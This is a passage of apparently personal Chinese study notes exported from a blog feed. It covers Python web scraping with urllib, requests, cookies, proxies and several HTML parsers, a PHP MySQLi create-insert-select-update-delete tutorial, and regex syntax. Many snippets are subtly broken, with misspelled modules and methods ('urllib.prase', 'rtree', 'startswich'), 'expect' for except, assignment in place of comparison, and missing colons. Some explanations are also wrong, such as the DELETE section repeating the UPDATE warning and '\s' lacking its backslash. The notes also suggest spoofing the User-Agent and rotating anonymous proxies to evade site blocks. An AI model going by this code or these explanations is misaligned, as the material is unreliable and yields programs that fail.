title="urllib"></a>urllib</h4><p>py自带的网络请求库<br>模块:<br>urllib.request打开并读取url</p><pre><code>模拟浏览器发送请求并获取响应结果data默认为None即Get请求，post请求时要将data以字典形式存储，由字典类型转换成字节类型转换成的数据类型看网页源代码【GET】import urllib.requesturl=&#39;https......&#39;                           //传入urlresponse=urllib.request.urlopen(url)        //发送get请求html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【POST】import urllib.requesturl=&#39;https......&#39;                           //传入urldata=&#123;&#39;a&#39;:&#39;A&#39;,&#39;b&#39;:&#39;B&#39;,&#39;action&#39;:&#39;login&#39;&#125;     //从Form Data处查看response=urllib.request.urlopen(url,data=bytes(urllib.prase.urlencode(data),encoding=&#39;utf-8&#39;))html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【通过伪造请求头绕过418】import urllib.requesturl=&#39;https......&#39;                           //传入urlheader=&#123;&#39;User-Agent&#39;:&#39;浏览器信息&#39;&#125;request=urllib.request.Request(url,headers=header)response=urllib.request.urlopen(request)html=response.read().decode(&#39;utf-8&#39;)        //读取响应并将数据类型转为strprint(html)</code></pre><p>urllib.error包含提出的异常urllib.request</p><pre><code>import urllib.requestimport urllib.errorurl=&#39;目标地址&#39;try:    response=urllib.request.urlopen(url)    //尝试链接expect urllib.error.URLError as e:          //捕获返回信息    print(e.reason)</code></pre><p>urllib.parse解析url</p><pre><code>import urllib.parsea=&#123;&#39;A&#39;:&#39;内容&#39;&#125;                              //创建键值对result1=urllib.parse.urlencode(a)           //url编码result2=urllib.prase.unquote(result1)       //url解码属性:code:请求返回的状态码reason:返回错误的原因headers:请求返回的响应头信息</code></pre><p>urllib.robotparase解析robots.txt文件</p><h4 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h4><p>网站会拒绝同一IP多次访问<br>命令行中输入ipconfig的IPv4是本地IP<br>分类:<br>1.透明代理，知道使用了且知道源IP<br>2.匿名代理，知道使用了但是不知道源IP<br>3.高匿代理，都不知道<br><a href="https://www.xicidaili.com/nn/">免费网站</a><br>语法:</p><pre><code>from urllib.request import build_openerfrom urllib.request import ProxyHandlerproxy=ProxyHandler(&#123;&#39;协议类型http/https&#39;:&#39;IP地址:端口&#39;&#125;)opener=build_opener(proxy)url=&#39;目标地址&#39;response=opener.open(url)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><p>使用步骤:<br>1.实例化MozillaCookieJar(保存cookie)<br>2.创建handler对象(cookie的处理器)<br>3.创建opener对象<br>4.打开网页发送请求获取响应<br>5.保存cookie文件<br>语法:</p><pre><code>import urllib.requestfrom http import cookiejarfilename=&#39;cookie.txt&#39;def get_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar(filename)           //实例化MCJ    handler=urllib.request.HTTPCookieProcessor(cookie)    //创建handler对象    opener=urllib.request.build_opener(handler)           //创建opener对象    url=&#39;目标地址&#39;    response=opener.open(url)                             //发送请求并获取响应    cookie.save()                                         //保存cookie文件def use_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar()                   //实例化MCJ    cookie.load(filename)                                 //加载cookie文件    print(cookie)if __name__ = &#39;__main__&#39;:    use_cookie()                                          //读取cookie</code></pre><h4 id="requests库-包括上面的功能"><a href="#requests库-包括上面的功能" class="headerlink" title="requests库(包括上面的功能)"></a>requests库(包括上面的功能)</h4><pre><code>常用方法:requestsrequests.request(url)            //构造请求requests.get(url,params=None)    //Get请求。params可省略,params是请求的参数requests.post(url,data=None,json=None)requests.head()                  //获取html头部信息requests.put()                   //发送Put请求requests.patch()                 //提交局部修改的请求requests.delete()                //提交删除请求params是请求参数常用属性:response.status_code             //响应状态码response.content                 //response对象转为二进制数据response.text                    //response对象转为字符串数据response.encoding                //定义response对象编码response.cookies()               //获取请求后的cookieresponse.session()               //获取请求后的sessionresponse.url                     //获取请求网址response.json()                  //内置JSON解码器Response.headers                 //以字典对象存储服务器响应头，字典不分大小写获取二进制数据实例:import requestsurl=&#39;目标文件的地址&#39;response=requests.get(url)with open(&#39;文件名,模式&#39;,&#39;wb&#39;) as file:              //读写文件的操作    file.write(response.content)    常用参数:r:   以只读方式打开文件。文件的指针将会放在文件的开头。这是**默认模式**。r+:  打开一个文件用于读写。文件指针将会放在文件的开头。w:   打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。w+:  打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。a:   打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。a+:  打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。rb:  以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。rb+: 以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。wb:  以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。wb+: 以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。ab:  以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。ab+: 以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。file.read([size])        将文件数据作为字符串返回，可选参数size控制读取的字节数file.readlines([size])   返回文件中行内容的列表，size参数可选file.write(str)          将字符串写入文件file.writelines(strings) 将字符串序列写入文件file.close()             关闭文件file.closed              表示文件已经被关闭，否则为Falsefile.mode                Access文件打开时使用的访问模式file.encoding            文件所使用的编码file.name                文件名file.newlines            未读取到行分隔符时为None，只有一种行分隔符时为一个字符串，当文件有多种类型的行结束符时，则为一个包含所有当前所遇到的行结束的列表file.softspace           为0表示在输出一数据后，要加上一个空格符，1表示不加。这个属性一般程序员用不着，由程序内部使用</code></pre><h4 id="XPath解析数据-lxml库"><a href="#XPath解析数据-lxml库" class="headerlink" title="XPath解析数据(lxml库)"></a>XPath解析数据(lxml库)</h4><p>概述:<br>小型查询语言，在XML文档中查找信息的语言<br>优点:<br>可在XPath中查找信息<br>支持HTML查找<br>可通过元素和属性进行导航<br>XML树形结构和语句与HTML相类似<br>XPath语法点击<a href="https://blog.csdn.net/Victor2code/article/details/108298390?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166877297016782395359090%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166877297016782395359090&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-108298390-null-null.142%5Ev65%5Eopensearch_v2,201%5Ev3%5Econtrol,213%5Ev2%5Et3_esquery_v2&utm_term=xpath%E8%AF%AD%E6%B3%95&spm=1018.2226.3001.4187">此处</a><br>代码实现:</p><pre><code>import requestsfrom lxml import etreeurl=&#39;目标地址&#39;headers=&#123;请求头信息，以键值对形式存储&#125;response=requests.get(url,headers)etree=rtree.HTML(response.text)                       //将响应的str类型转换为etree类型A=etree.xpath(&#39;谷歌浏览器中XPath的语句&#39;)              //获取内容B=etree.path(&#39;另一个语句&#39;)for A中定位的元素,B中定位的元素 in zip(A,B)           //遍历打包    print(A中定位的元素, &#39;:&#39; ,B中定位的元素)          //输出</code></pre><h4 id="BeautifulSoup解析数据-bs4库"><a href="#BeautifulSoup解析数据-bs4库" class="headerlink" title="BeautifulSoup解析数据(bs4库)"></a>BeautifulSoup解析数据(bs4库)</h4><p>概述:<br>能从HTML和XML文件中提取数据的库<br>语法:</p><pre><code>                        【Tag对象】print(bs.标签)                       //获取标签print(bs.标签.attrs)                 //获取标签的全部属性print(bs.标签[&#39;属性名&#39;])             //获取属性值print(bs.标签.text)                  //获取标签的文本内容(不包括注释内的)print(bs.标签.string)                //获取标签的文本内容(包括注释内的)                        【CSS选择器】print(bs.select(&#39;ID&#39;))               //ID查找print(bs.select(&#39;classa&#39;))           //classa查找print(bs.select(标签,属性))          //属性查找                        【其他功能】print(bs.find(标签,属性))            //提取首个满足条件的print(bs.find_all(标签,属性))        //提取所有满足条件的</code></pre><p>代码实现:</p><pre><code>import requestsfrom bs4 import BeautifulSoupurl=&#39;目标地址&#39;headers=&#123;头文件键值对&#125;response=requests.get(url,headers)bs=BeautifulSoup(response.text,&#39;html.parser&#39;)               //bs=BeautifulSoup(response.text,&#39;lxml&#39;)二选一使用即可a_list=bs.find_all(&#39;标签&#39;)for a in a_list:    url=a.get(&#39;属性&#39;)    if url==None                                              //以None开头的url无用        continue    if url.startswich(&#39;http&#39;) or url.startswich(&#39;https&#39;)      //保留以http或https开头的url        print(url)</code></pre><h4 id="正则表达式-re库"><a href="#正则表达式-re库" class="headerlink" title="正则表达式(re库)"></a>正则表达式(re库)</h4><p>概述:<br>特殊的字符序列，检查字符串是否与某种模式相匹配<br>正则语法:</p><pre><code>.           //匹配任意字符^           //匹配字符串开头$           //匹配字符串末尾*           //匹配前一个元字符0到多次+           //匹配前一个元字符1到多次?           //匹配前一个元字符0到1次&#123;m&#125;         //匹配前一个元字符m次&#123;m,n&#125;       //匹配前一个元字符m到n次&#123;m,n&#125;?      //匹配前一个元字符m到n次，并去尽可能少的情况\\          //对特殊字符转义[]          //字符集合，匹配其中任意一个字符|           //或(...)       //作为一个元组，findall在有组情况下只显示组的内容</code></pre><p>特殊序列:</p><pre><code>\A          //只在字符串开头匹配\b          //匹配开头或结尾的空字符串\B          //匹配不位于开头或结尾的空字符串\d          //匹配十进制数，[0-9]\D          //匹配非字符数字字符，[^0-9]s           //匹配空白字符，[\t\n\r\f\v]\S          //匹配非空白字符，[^\t\n\r\f\v]\w          //匹配数字字母下划线，[a-z A-Z 0-9]\W          //匹配非数字字母下划线，[^a-z A-Z 0-9]\Z          //只在字符串末尾进行匹配[\u4e00-\u9fa5]         //中文</code></pre><p>正则处理函数:</p><pre><code>re.match(pattern,string,flags=0)                  //从字符串开头匹配模式，成功则返回成功的对象，否则返回Nonere.search(pattern,string,flags=0)                 //扫描整个字符串返回第一个成功匹配的对象，失败则返回Nonere.findall(pattern,string,flags=0)                //获取列表的所有匹配的字符串，以列表形式返回re.sub(pattern,repl,string,count=0,flags=0)       //用于替换字符串的匹配项，没有匹配项则返回没有匹配的字符串re.compile(pattern,[,flag])                       //编译正则表达式，生成正则表达式对象，供match和search函数使用</code></pre><h4 id="爬取并下载视频示例"><a href="#爬取并下载视频示例" class="headerlink" title="爬取并下载视频示例"></a>爬取并下载视频示例</h4><pre><code>import requestsimport reurl=&#39;目标地址&#39;headers=&#123;请求头&#125;response=requests.get(url,headers=headers)                            //发送请求info=re.findall(&#39;标签，配合使用正则表达式&#39;,response.text)             //正则查找所有符合要求的对象lst=[]for item in info:    lst.append(&#39;https:&#39;+item)                                         //将符合条件的对象放入列表中并补全绝对路径count=0for item in lst:    count+=1    response=requests.get(item.headers=headers)                       //将补全的路径再次请求    with open(&#39;存储路径&#39;+str(count)+&#39;后缀&#39;) as file                   //设置下载路径和文件名        file.write(response.content)                                  //将文件存为二进制print(下载完毕)</code></pre><h4 id="pyquery解析数据-pyquery库"><a href="#pyquery解析数据-pyquery库" class="headerlink" title="pyquery解析数据(pyquery库)"></a>pyquery解析数据(pyquery库)</h4><p>概述:<br>是jQuery的Python实现，可以jQuery语法操作解析HTML文档，易用性和解析速度很好<br>初始化方式:</p><pre><code>字符串方式from pyquery import PyQuery as pyhtml=&#39;html代码&#39;doc=py(html)      //创建PyQuery对象，将str类型转换为PyQuery类型url方式from pyquery import PyQuerydoc=PyQuery(url=&#39;地址&#39;,encoding=&#39;utf-8&#39;)文件from pyquery import PyQuerydoc=PyQuery(filename=&#39;存有html文件的地址&#39;)</code></pre><p>使用方式:</p><pre><code>doc(&#39;#main&#39;)                             //获取当前节点doc(&#39;#main&#39;).children()                  //获取子节点doc(&#39;#main&#39;).parent()                    //获取父节点doc(&#39;#main&#39;).sinlings()                  //获取兄弟节点doc(&#39;标签&#39;)attr(&#39;属性&#39;)                  //获取属性值doc(&#39;#main&#39;).html()                      //获取内容，以html代码形式显示doc(&#39;#main&#39;).text()                      //获取内容，以文本显示显示</code></pre><p>代码实现:</p><pre><code>import requestsfrom pyquery import PyQuery as pyurl=&#39;&#39;headers=&#123;&#125;response=resquests.get(url,headers=headers)   //发送请求doc=py(response.text)                         //初始化PyQuery对象A=[x.text for x in doc(h4 a)]                 //从doc中提取h4中的a标签的内容传给x，再显示x的文本部分</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>requests用于发送和接收请求<br>四种解析方式是数据的提取<br>对于爬虫更重要的是提取了数据之后对数据的操作</p><h4 id="2023-3-3补档"><a href="#2023-3-3补档" class="headerlink" title="2023.3.3补档"></a>2023.3.3补档</h4><p>今日发现一个好用的库叫做URLParser，可以去尝试一下</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="想不清楚一件事，往往因为这件事里有你想逃避的东西。"><a href="#想不清楚一件事，往往因为这件事里有你想逃避的东西。" class="headerlink" title="想不清楚一件事，往往因为这件事里有你想逃避的东西。"></a>想不清楚一件事，往往因为这件事里有你想逃避的东西。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql</title>
      <link href="/2022/11/16/20221116/"/>
      <url>/2022/11/16/20221116/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><p>php7之前是mysql链接(硬链接)<br>php7之后是mysqli链接(i链接/improved链接)</p><h4 id="PHP连接数据库-MySQLi-面向对象"><a href="#PHP连接数据库-MySQLi-面向对象" class="headerlink" title="PHP连接数据库(MySQLi - 面向对象)"></a>PHP连接数据库(MySQLi - 面向对象)</h4><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;echo &quot;Connected successfully&quot;;?&gt;</code></pre><h4 id="关闭连接-MySQLi-面向对象"><a href="#关闭连接-MySQLi-面向对象" class="headerlink" title="关闭连接(MySQLi - 面向对象)"></a>关闭连接(MySQLi - 面向对象)</h4><p>连接在脚本执行完后会自动关闭,也可以手动关闭<br>$conn-&gt;close();</p><h4 id="创建数据库-MySQLi-面向对象"><a href="#创建数据库-MySQLi-面向对象" class="headerlink" title="创建数据库(MySQLi - 面向对象)"></a>创建数据库(MySQLi - 面向对象)</h4><p>需要 CREATE 权限来创建或删除 MySQL 数据库。</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;// 创建连接$conn = new mysqli($servername, $username, $password);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// Create database$sql = &quot;CREATE DATABASE myDB&quot;;                     //库名叫做myDBif ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Database created successfully&quot;;&#125; else &#123;    echo &quot;Error creating database: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><h4 id="创建表-MySQLi-面向对象"><a href="#创建表-MySQLi-面向对象" class="headerlink" title="创建表(MySQLi - 面向对象)"></a>创建表(MySQLi - 面向对象)</h4><p>在 PHP 中创建完数据库之后，我们需要在数据库中创建一个或者多个的数据表。<br>一个数据表有一个唯一名称，并有行和列组成。<br>创建表前，我们需要使用use myDB;来选择要操作的数据库</p><pre><code>&lt;?php$servername = &quot;localhost&quot;;$username = &quot;username&quot;;$password = &quot;password&quot;;$dbname = &quot;myDB&quot;;// 创建连接$conn = new mysqli($servername, $username, $password, $dbname);// 检测连接if ($conn-&gt;connect_error) &#123;    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);&#125;// sql to create table$sql = &quot;CREATE TABLE MyGuests (id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,firstname VARCHAR(30) NOT NULL,lastname VARCHAR(30) NOT NULL,email VARCHAR(50),reg_date TIMESTAMP)&quot;;if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;Table MyGuests created successfully&quot;;&#125; else &#123;    echo &quot;Error creating table: &quot; . $conn-&gt;error;&#125;$conn-&gt;close();?&gt;</code></pre><p>其中表内数据类型有<a href="https://www.w3cschool.cn/mysql/sql-datatypes.html">规定</a></p><p>同时可以为每个列指定其他选项的属性:<br>NOT NULL - 每一行都必须含有值（不能为空），null 值是不允许的。<br>DEFAULT value - 设置默认值<br>UNSIGNED - 使用无符号数值类型，0 及正数<br>AUTO INCREMENT - 设置 MySQL 字段的值在新增记录时每次自动增长 1<br>PRIMARY KEY - 设置数据表中每条记录的唯一标识。 通常列的 PRIMARY KEY 设置为 ID 数值，与AUTO_INCREMENT 一起使用。</p><p>每个表都应该有一个主键(本列为 “id” 列)，主键必须包含唯一的值。</p><h4 id="插入数据-MySQLi-面向对象"><a href="#插入数据-MySQLi-面向对象" class="headerlink" title="插入数据(MySQLi - 面向对象)"></a>插入数据(MySQLi - 面向对象)</h4><p>语法规则:<br>1.PHP 中 SQL 查询语句必须使用引号<br>2.在 SQL 查询语句中的字符串值必须加引号<br>3.数值的值不需要引号<br>4.NULL 值不需要引号<br>向 MySQL 表添加新的记录:<br>INSERT INTO table_name (column1, column2, column3,…)<br>VALUES (value1, value2, value3,…)</p><pre><code>在连接检测和关闭数据库中间加入$sql = &quot;INSERT INTO MyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;)&quot;;                    //向 &quot;MyGuests&quot; 表添加新的记录if ($conn-&gt;query($sql) === TRUE) &#123;    echo &quot;New record created successfully&quot;;&#125; else &#123;    echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;&#125;</code></pre><h4 id="插入多条数据-MySQLi-面向对象"><a href="#插入多条数据-MySQLi-面向对象" class="headerlink" title="插入多条数据(MySQLi - 面向对象)"></a>插入多条数据(MySQLi - 面向对象)</h4><p>【方法一:使用函数】<br>mysqli_multi_query() 函数可用来执行多条SQL语句。</p><pre><code>$sql = &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;John&#39;, &#39;Doe&#39;, &#39;john@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Mary&#39;, &#39;Moe&#39;, &#39;mary@example.com&#39;);&quot;;$sql .= &quot;INSERT INTOMyGuests (firstname, lastname, email)VALUES (&#39;Julie&#39;, &#39;Dooley&#39;, &#39;julie@example.com&#39;)&quot;;if ($conn-&gt;multi_query($sql) === TRUE) &#123;echo &quot;Newrecords created successfully&quot;;&#125; else &#123;echo&quot;Error: &quot; . $sql . &quot;&quot; . $conn-&gt;error;&#125;</code></pre><p>注意:每个SQL语句必须用分号隔开。</p><p>【方法二:MySQLi 使用预处理语句】</p><pre><code>// 为 mysqli_stmt_prepare() 初始化statement 对象$stmt =mysqli_stmt_init($conn);//预处理语句if (mysqli_stmt_prepare($stmt, $sql)) &#123;// 绑定参数mysqli_stmt_bind_param($stmt, &#39;sss&#39;, $firstname, $lastname, $email);// 设置参数并执行$firstname = &#39;John&#39;;$lastname= &#39;Doe&#39;;$email =&#39;john@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Mary&#39;;$lastname= &#39;Moe&#39;;$email =&#39;mary@example.com&#39;;mysqli_stmt_execute($stmt);$firstname = &#39;Julie&#39;;$lastname = &#39;Dooley&#39;;$email =&#39;julie@example.com&#39;;mysqli_stmt_execute($stmt);&#125;</code></pre><p>每个参数必须指定类型，来保证数据的安全性。通过类型的判断可以减少SQL注入漏洞带来的风险。<br>参数类型:<br>i - integer<br>d - double<br>s - string<br>b - BLOB</p><h4 id="MySQLi使用预处理语句-包括面向对象和面向过程"><a href="#MySQLi使用预处理语句-包括面向对象和面向过程" class="headerlink" title="MySQLi使用预处理语句(包括面向对象和面向过程)"></a>MySQLi使用预处理语句(包括面向对象和面向过程)</h4><p>流程:<br>1.预处理:创建 SQL 语句模板并发送到数据库。预留的值使用参数 “?” 标记<br>2.数据库解析并编译(内部处理):对SQL语句模板执行查询优化，并存储结果(不输出)<br>3.执行:将应用绑定的值传递给参数（?标记），数据库执行语句。(如果参数的值不一样,可以多次执行语句)</p><p>优点:<br>1.减少了分析时间，只做了一次查询（虽然语句多次执行）<br>2.绑定参数减少了服务器带宽，你只需要发送查询的参数，而不是整个语句<br>3.预处理语句针对SQL注入是非常有用的，因为参数值发送后使用不同的协议，保证了数据的合法性。</p><pre><code>// 步骤一，prepare and bind$stmt = $conn-&gt;prepare(&quot;INSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?)&quot;);$stmt-&gt;bind_param(&quot;sss&quot;, $firstname, $lastname, $email);// 步骤三，设置参数并执行$firstname = &quot;John&quot;;$lastname = &quot;Doe&quot;;$email = &quot;john@example.com&quot;;$stmt-&gt;execute();$firstname = &quot;Mary&quot;;$lastname = &quot;Moe&quot;;$email = &quot;mary@example.com&quot;;$stmt-&gt;execute();             $firstname = &quot;Julie&quot;;$lastname = &quot;Dooley&quot;;$email = &quot;julie@example.com&quot;;$stmt-&gt;execute();echo &quot;New records created successfully&quot;;$stmt-&gt;close();</code></pre><p>语句中如果有?就转换为其他类型的数据</p><h4 id="读取数据-MySQLi-面向对象"><a href="#读取数据-MySQLi-面向对象" class="headerlink" title="读取数据(MySQLi - 面向对象)"></a>读取数据(MySQLi - 面向对象)</h4><pre><code>SELECT 语句用于从数据表中读取数据:SELECT column_name(s) FROM table_name我们可以使用 * 号来读取所有数据表中的字段:SELECT * FROM table_name用 WHERE 命令来筛选出满足条件的结果:SELECT column_name(s)  FROM table_name  WHERE column_name operator value——————————————————————————————————————————————————————————————————————————————                           【SELECT】$sql = &quot;SELECT id, firstname, lastname FROM MyGuests&quot;;$result = $conn-&gt;query($sql);if ($result-&gt;num_rows &gt; 0) &#123;    // 输出每行数据    while($row = $result-&gt;fetch_assoc()) &#123;        echo &quot;id: &quot;. $row[&quot;id&quot;]. &quot; - Name: &quot;. $row[&quot;firstname&quot;]. &quot; &quot; . $row[&quot;lastname&quot;]. &quot;&lt;br&gt;&quot;;    &#125;&#125; else &#123;    echo &quot;0 results&quot;;&#125;——————————————————————————————————————————————————————————————————————————————                           【WHERE】$result = mysqli_query($con,&quot;SELECT * FROM PersonsWHERE FirstName=&#39;Peter&#39;&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;] . &quot; &quot; . $row[&#39;LastName&#39;];echo &quot;&lt;br&gt;&quot;;&#125;</code></pre><h4 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h4><pre><code>ORDER BY 关键词用于对记录集中的数据进行排序。SELECT column_name(s)FROM table_nameORDER BY column1, column2... ASC|DESC    默认是升序ASC，DESC改为降序$result = mysqli_query($con,&quot;SELECT * FROM Persons ORDER BY age&quot;);while($row = mysqli_fetch_array($result))&#123;echo $row[&#39;FirstName&#39;];echo &quot; &quot; . $row[&#39;LastName&#39;];echo &quot; &quot; . $row[&#39;Age&#39;];echo &quot;&lt;br&gt;&quot;;&#125;可以根据多个列进行排序(第一列的值相同时才使用第二列)</code></pre><h4 id="更新数据"><a href="#更新数据" class="headerlink" title="更新数据"></a>更新数据</h4><p>UPDATE 语句用于更新数据库表中已存在的记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:UPDATE table_name SET column1=value, column2=value2,... WHERE some_column=some_value 操作:mysqli_query($con,&quot;UPDATE Persons SET Age=36WHERE FirstName=&#39;Peter&#39; AND LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h4><p>DELETE FROM 语句用于从数据库表中删除记录。<br>WHERE 子句规定了哪些记录需要更新。<br>如果您想省去 WHERE 子句，所有的记录都会被更新！<br>PHP执行该语句，必须使用mysqli_query()函数(该函数用于向 MySQL 连接发送查询或命令)</p><pre><code>语法:DELETE FROM table_name WHERE some_column = some_value操作:mysqli_query($con,&quot;DELETE FROM Persons WHERE LastName=&#39;Griffin&#39;&quot;);</code></pre><h4 id="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处"><a href="#PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi-面向过程和PDO请前往此处" class="headerlink" title="PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往此处"></a>PHP中有关MySQL数据库的内容暂时告一段落，若想了解MySQLi - 面向过程和PDO请前往<a href="https://www.w3cschool.cn/php/php-mysql-connect.html">此处</a></h4><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="我们生而破碎，用活着来修修补补。"><a href="#我们生而破碎，用活着来修修补补。" class="headerlink" title="我们生而破碎，用活着来修修补补。"></a>我们生而破碎，用活着来修修补补。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/2022/11/15/20221115/"/>
      <url>/2022/11/15/20221115/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>概念:正则表达式是用于描述字符排列和匹配模式的一种语法规则。<br>作用:<br>1.匹配，也常常用于从字符串中析取信息。<br>2.用新文本代替匹配文本。<br>3.将一个字符串拆分为一组更小的信息块。<br>基本语法:<br>1.正则匹配模式使用分隔符与元字符组成<br>(1)分隔符可以是非数字、非反斜线、非空格的任意字符<br>(2)经常使用的分隔符是正斜线(/)、hash符号(#) 以及取反符号(~)<br>2.元字符是用于构造规则表达式的具有特殊含义的字符<br>3.如果要在正则表达式中包含元字符本身，必须在其前加上”\”进行转义 </p><pre><code>           【常见元字符】 元字符             说明*                0次、1次或多次匹配其前的原子+                1次或多次匹配其前的原子?                0次或1次匹配其前的原子|                匹配两个或多个选择^                匹配字符串串首的原子$                匹配字符串串尾的原子[]                匹配方括号中的任一原子[^]                匹配除方括号中的原子外的任何字符&#123;m&#125;                表示其前原子恰好出现m次&#123;m,n&#125;            表示其前原子至少出现m次，至少出现n次(n&gt;m)&#123;m,&#125;            表示其前原子出现不少于m次()                整体表示一个原子.                匹配除换行之外的任何一个字符边界限制:1.^和$分别指定字符串的开始和结束。2.^Tom$精确匹配————Tom模糊匹配3.重复匹配:    ?匹配存在?前的一个字母或是不存在这个字母的字符串    *匹配0/1/多次匹配该字母的字符串    +匹配1/多次该字母的字符串    .匹配除换行符外的任何字符    .*组合称为全匹配符或单含匹配符    &#123;&#125;指定原子重复的次数        &#123;m&#125;表示其前原子恰好出现m次；        &#123;m，n&#125;表示其前原子至少出现m次，至多出现n次；        &#123;m，&#125;表示其前原子出现不少于m次。    []匹配其中的一个原子并且地位平等    |匹配多个选择之一，可以连用|4.模式单元:    ()将其中的正则表达式变为原子(或称为模式单元)使用————其实用处相等于数学的括号5.模式匹配的顺序(从高到低):  顺序    元字符         说明  1        （）          模式单元      2       ？* +&#123;&#125;        重复匹配  3         ^$           边界限制  4         |            模式选择</code></pre><p>特殊字符:<br>$匹配输入字符串的结尾位置<br>()标记表达式开始与结束的位置<br>*匹配前面的子表达式0次或多次<br>+匹配前面的子表达式1次或多次<br>.匹配除换行符\n外的任何单字符<br>[标记一个中括号表达式的开始<br>?匹配前面的子表达式0次或一次，或指明一个非贪婪限定符<br>\将下一个字符标记为特殊字符/原义字符/向后引用/八进制转义符<br>^匹配字符串的开始位置(在方括号中表示不接受该字符集合)<br>{标记限定符巴达兽的开始<br>|指明两项之间的一个选择</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="生活哪有什么胜利可言，挺住意味着一切。"><a href="#生活哪有什么胜利可言，挺住意味着一切。" class="headerlink" title="生活哪有什么胜利可言，挺住意味着一切。"></a>生活哪有什么胜利可言，挺住意味着一切。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元字符表</title>
      <link href="/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/"/>
      <url>/2022/11/15/%E5%85%83%E5%AD%97%E7%AC%A6%E8%A1%A8/</url>
      
